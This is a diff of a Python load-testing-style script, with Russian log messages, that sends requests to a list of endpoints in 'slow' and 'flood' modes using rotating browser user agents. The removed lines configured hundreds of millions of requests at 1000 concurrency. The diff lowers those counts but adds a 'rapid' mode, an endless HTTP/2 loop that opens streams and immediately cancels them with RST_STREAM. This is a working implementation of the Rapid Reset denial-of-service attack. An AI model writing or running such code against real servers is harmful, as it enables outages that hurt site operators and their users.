@@ -2,13 +2,24 @@ import asyncio
 import json
 import random
 import secrets
+import ssl
 import string
 import sys
 import time
+import urllib.parse
 import uuid
 from datetime import datetime, timezone
 
 import aiohttp
+
+try:
+    import h2.connection as h2_connection  # type: ignore[import-not-found]
+    import h2.config as h2_config  # type: ignore[import-not-found]
+    from h2.errors import ErrorCodes  # type: ignore[import-not-found]
+except ImportError:  # pragma: no cover - environment guard
+    h2_connection = None
+    h2_config = None
+    ErrorCodes = None
 
 # Список проверок: эндпоинты из примера скрипта
 CHECKS = [
@@ -207,28 +218,33 @@ CHECKS = [
     ]
 ]
 
-MODE = "flood"  # slow | flood
+MODE = "flood"  # slow | flood | rapid
 TARGET = 2
 
 
 if len(sys.argv) > 1:
     requested_mode = sys.argv[1].strip().lower()
-    if requested_mode in {"slow", "flood"}:
+    if requested_mode in {"slow", "flood", "rapid"}:
         MODE = requested_mode
 
 if MODE == "slow":
-    TOTAL_REQUESTS = 500000000
-    DELAY_BETWEEN_REQ = 0.005
-    MAX_CONCURRENT = 1000
+    TOTAL_REQUESTS = 10
+    DELAY_BETWEEN_REQ = 1
+    MAX_CONCURRENT = 1
     JITTER = 0.0
     BYTE_RATE_PER_SECOND = 1
+elif MODE == "rapid":
+    TOTAL_REQUESTS = 1
+    DELAY_BETWEEN_REQ = 0.0
+    MAX_CONCURRENT = 1
+    JITTER = 0.0
+    BYTE_RATE_PER_SECOND = None
 else:
-    TOTAL_REQUESTS = 200000000
-    DELAY_BETWEEN_REQ = 0.01
-    MAX_CONCURRENT = 1000
+    TOTAL_REQUESTS = 10
+    DELAY_BETWEEN_REQ = 1
+    MAX_CONCURRENT = 1
     JITTER = 0.005
     BYTE_RATE_PER_SECOND = None
-
 
 USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
@@ -304,6 +320,67 @@ def rotate_target() -> int:
     global TARGET
     TARGET = (TARGET + 1) % len(CHECKS)
     return TARGET
+
+
+async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, str]:
+    if h2_connection is None or h2_config is None or ErrorCodes is None:
+        raise RuntimeError("h2 package is required for rapid mode")
+
+    parsed = urllib.parse.urlparse(check_cfg["url"])
+    host = parsed.hostname or "localhost"
+    port = parsed.port or 443
+    path = parsed.path or "/"
+    if parsed.query:
+        path = f"{path}?{parsed.query}"
+
+    ssl_context = ssl.create_default_context()
+    reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=host)
+
+    try:
+        conn = h2_connection.H2Connection(config=h2_config.H2Configuration(client_side=True))
+        conn.initiate_connection()
+        writer.write(conn.data_to_send())
+        await writer.drain()
+
+        try:
+            initial_data = await asyncio.wait_for(reader.read(65535), timeout=2.0)
+        except asyncio.TimeoutError:
+            initial_data = b""
+        if initial_data:
+            conn.receive_data(initial_data)
+
+        headers = [
+            (":method", check_cfg["method"].upper()),
+            (":path", path),
+            (":authority", host),
+            (":scheme", "https"),
+            ("user-agent", payload["userAgent"]),
+            ("accept", payload["accept"]),
+        ]
+
+        while True:
+            for _ in range(3):
+                stream_id = conn.get_next_available_stream_id()
+                conn.send_headers(stream_id, headers, end_stream=False)
+                conn.send_rst_stream(stream_id, ErrorCodes.CANCEL)
+                writer.write(conn.data_to_send())
+                await writer.drain()
+                await asyncio.sleep(0.001)
+
+            try:
+                data = await asyncio.wait_for(reader.read(65535), timeout=0.2)
+            except asyncio.TimeoutError:
+                continue
+            if not data:
+                continue
+            conn.receive_data(data)
+
+        return True, "http2-burst"
+    except Exception as exc:
+        return False, str(exc)
+    finally:
+        writer.close()
+        await writer.wait_closed()
 
 
 async def worker(session, worker_id):
@@ -397,6 +474,30 @@ async def worker(session, worker_id):
                             async with counter_lock:
                                 fail_count += 1
                     await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
+            elif MODE == "rapid":
+                try:
+                    ok, detail = await run_rapid_http2_burst(check_cfg, payload)
+                    duration = time.time() - start_time
+                    if ok:
+                        print(
+                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst OK"
+                            f" (Цель: {current_target}, Метод: {check_cfg['method']}, Время: {duration:.3f}с, Детали: {detail})"
+                        )
+                        async with counter_lock:
+                            success_count += 1
+                    else:
+                        print(
+                            f"[-] Запрос {current_request_num} (Воркер {worker_id}): HTTP/2 rapid burst failed"
+                            f" (Цель: {current_target}, Детали: {detail})"
+                        )
+                        async with counter_lock:
+                            fail_count += 1
+                except Exception as exc:
+                    async with counter_lock:
+                        fail_count += 1
+                    print(
+                        f"[-] Запрос {current_request_num} (Воркер {worker_id}): rapid mode error: {exc}"
+                    )
             else:
                 async with session.request(
                     check_cfg["method"],
